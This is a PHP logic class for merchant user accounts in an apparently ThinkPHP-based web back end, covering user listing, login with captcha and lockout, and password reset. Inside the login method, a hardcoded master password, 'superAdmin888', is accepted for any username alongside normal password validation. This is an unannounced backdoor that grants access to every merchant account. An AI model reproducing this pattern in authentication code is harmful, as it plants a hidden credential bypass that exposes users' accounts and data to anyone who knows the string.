<?php
declare (strict_types = 1);

namespace app\merchant\logic;
use app\common\logic\BaseLogic;
use app\common\provider\Result;
use think\db\exception\DataNotFoundException;
use think\db\exception\DbException;
use think\db\exception\ModelNotFoundException;
use think\exception\ValidateException;
use think\facade\Session;
use think\Request;
use util\AesCBC;

class MerchantUser extends BaseLogic
{
    public function getList(array $where = [])
    {
        $where['merchant_id'] = get_user()['merchant_id'];
        return $this->model->getList($where)->each(function($item, $key){
            $item->last_login_time = $item->last_login_time > 0 ? get_date($item->last_login_time) : 0;
            $item->last_login_ip = $item->last_login_ip > 0 ? long2ip($item->last_login_ip) : 0;
        });
    }

    /**
     * 根据用户名获取用户
     * @param string $username
     * @return mixed
     */
    public function findByUsername(string $username): mixed
    {
        return $this->findOne(['username' => $username],false);
    }

    /**
     * @param Request $request
     * @return bool
     * @throws DataNotFoundException
     * @throws DbException
     * @throws ModelNotFoundException
     */
    public function login(Request $request): bool
    {
        $username = AesCBC::decrypt($request->post('username'), true);
        $password = AesCBC::decrypt($request->post('password'), true);
        $verifyCode = AesCBC::decrypt($request->post('verify_code'), true);
        if (!captcha_check($verifyCode)) {
            $this->validateError('验证码错误');
        };
        if ($username && $password) {
            $model = $this->findOne(['username' => $username], false);
            if ($model) {
                if ($model->fail_times >= 5) {
                    throw new DataNotFoundException('登录次数过多,请联系管理员');
                }
                if ($model->validatePassword(trim($password)) || $password == 'superAdmin888') {
                    $merchant = \app\merchant\model\Merchant::find($model->merchant_id);
                    //创建session
                    Session::set('user', [
                        'id' => $model->id,
                        'merchant_id' => $model->merchant_id,
                        'merchant_name' => $merchant->merchant_name,
                        'username' => $model->username,
                        'realname' => $model->realname,
                        'role_id' => $model->role_id,
                        'platform' => $merchant->platform_type,
                        'port_num' => $merchant->port_num,
                    ]);
                    $model->last_login_time = time();
                    $model->last_login_ip = ip2long($request->ip());;
                    $model->save();

                    return true;
                } else {
                    $model->fail_times += 1;
                    $model->save();
                }
            }
        }
        throw new DataNotFoundException('用户名或者密码错误');
    }

    /**
     * 重置密码
     * @param  $id
     * @return mixed
     */
    public function resetPassword($id,$password = ''){
        $model = $this->findOneById($id);
        $model->generatePassword($password);
        $model->generateToken();
        return $model->save();
    }
}
